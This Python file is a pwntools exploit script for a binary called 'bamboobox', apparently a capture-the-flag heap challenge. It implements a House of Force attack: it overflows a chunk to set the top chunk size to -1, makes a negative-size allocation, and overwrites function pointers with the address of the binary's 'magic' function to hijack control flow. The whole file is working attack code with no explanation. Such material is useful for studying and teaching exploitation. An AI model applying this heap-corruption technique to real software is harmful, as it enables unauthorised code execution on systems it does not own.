#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
from zio import l64
from time import sleep
import sys
context.log_level = "debug"
context.terminal = ["deepin-terminal", "-x", "sh", "-c"]

io = process("./bamboobox")

#  def DEBUG():
	#  raw_input("DEBUG: ")
	#  gdb.attach(io)
#  io = gdb.debug("./bamboobox", "b *main\nc")


def add(length, name):
    io.sendlineafter(":", "2")
    io.sendlineafter(":", str(length))
    io.sendafter(":", name)

def change(idx, length, name):
    io.sendlineafter(":", "3")
    io.sendlineafter(":", str(idx))
    io.sendlineafter(":", str(length))
    io.sendafter(":", name)

def exit():
    io.sendlineafter(":", "5")

if __name__ == "__main__":
    #  DEBUG()
    add(0x60, cyclic(0x60))
    change(0, 0x60 + 0x10, cyclic(0x60) + p64(0) + l64(-1))
    add(-(0x60 + 0x10) - (0x10 + 0x10) - 0x10, 'aaaa') # -sizeof(item) - sizeof(box) - 0x10
    add(0x10, p64(ELF("./bamboobox").sym['magic']) * 2)
    exit()

    io.interactive()
    io.close()
